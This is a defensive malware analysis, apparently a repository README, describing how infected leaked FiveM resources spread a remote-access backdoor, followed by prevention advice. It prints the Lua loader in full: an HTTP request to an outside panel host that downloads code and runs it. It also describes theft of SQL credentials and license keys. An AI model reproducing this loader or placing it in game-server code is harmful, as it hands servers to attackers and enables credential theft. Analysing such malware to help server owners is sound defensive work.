This is a specific study into a pay-hack providers methodology.
Credit goes to the specific individuals which devoted a lot of time to discover this growing problem on FiveM, their identities are redacted.

# Analysis
Most FiveM malware is formed around Remote Execution/Administration Tool (RAT). 4 lines of Lua code are written into resources (many of them obfuscate the code) which will download remote code from the external servers. We've found many leaked resources are infected with this type of malware. This repository will talk more about how it works works.

# How it works
It works by individuals releasing infected code/resources to the FiveM public. Server owners/developers take the code (that they don't know is infected) and install it on their servers. Once the resource is installed and ran it will inject its code into other previously clean resources.

The initial infected code boils down to the following:

```Lua
PerformHttpRequest('https://malware-panel.io/_i/i?to=UNIQUECODE', function (e, d)
	local s = assert(load(d))
	if (d == nil) then return end 
	s() 
end)
```

The Unique Code in the URL request is the malware user that now has control of your server. Once this code is run it downloads the remote code and runs it on line 4 as a function.

This is the basis on how most malware works. It proceeds to download several more requests and will continue until it injects more pre-existing resources.

After the code is run, it will upload some javascript and override existing files within the system builders directory. 

`resources\[system]\[builders]` 

The code will start propagating itself within all of your resources and files within the FiveM server installation to make it difficult to remove.

At this stage, its armageddon and all files within the server are compromised meaning files can be downloaded, uploaded, edited and viewed, including but not limited to just the server.cfg, sql credentials or even steal your cfx license keys. They’re also able to run remote code on the server which leads to the last step. The MalScanner batch file in this repository aims to show you exactly where the infected code is.


**Make sure you do not run your FiveM server as ROOT (Linux) or Administrator (Windows)**



# Other things you can do to prevent being attacked by malware

Consider adding the [Warden](https://discord.com/invite/jeFeDRasfs) to your discord server. Warden is a great resource that can help remove cheaters and leakers (people who participate in sharing leaked paid resources) from your community or support hack products like Cipher. 

Make sure to install the latest updates of whatever framework you are using for 

[ESX](https://github.com/esx-framework/esx-legacy) | [ESX Discord](https://discord.esx-framework.org)

[QBCore](https://github.com/qbcore-framework/qb-core) | [QBCore Discord](https://discord.gg/qbcore) 

Consider investing in a good anticheat for your server like [Phoenix Anticheat](https://discord.com/invite/pac) or [FiveEye](https://dsc.gg/FiveEye) or any other anti-cheat that you feel comfortable using.

Buy resources from only reputable places that you feel comfortable purchasing from either Tebex listed stores or from places like [Modit](https://modit.store/), if you're unsure about a store, perhaps ask for guidance on the warden discord. 

Be extremely sketchy on code you get that is encrypted or downloaded from shady sources.

Lastly, the most important thing… **DON'T USE LEAKED RESOURCES!**
